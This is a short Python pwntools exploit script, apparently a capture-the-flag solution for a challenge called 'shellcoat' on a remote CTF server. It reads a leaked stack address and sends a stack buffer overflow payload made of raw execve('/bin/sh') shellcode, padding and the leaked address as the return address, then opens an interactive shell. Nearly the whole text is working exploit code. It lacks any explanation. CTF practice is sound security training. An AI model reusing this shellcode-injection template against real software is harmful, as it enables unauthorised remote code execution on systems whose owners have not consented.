from pwn import *


HOST = 'ctf-challs.sinf.pt'
PORT = 1338
# io = process("./shellcoat", level="debug")
io = remote(HOST, PORT, level='debug')
io.recvuntil("coat around ")

line = io.recvuntil("\n").strip()

leak_addr = int(line, 16)

addr_str = "".join(chr(c) for c in p64(leak_addr))

NOP = "\x90" * 40
shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
pad = 'A' * (264-len(shellcode))

injection = shellcode + pad + addr_str

io.sendline(injection)
io.interactive()
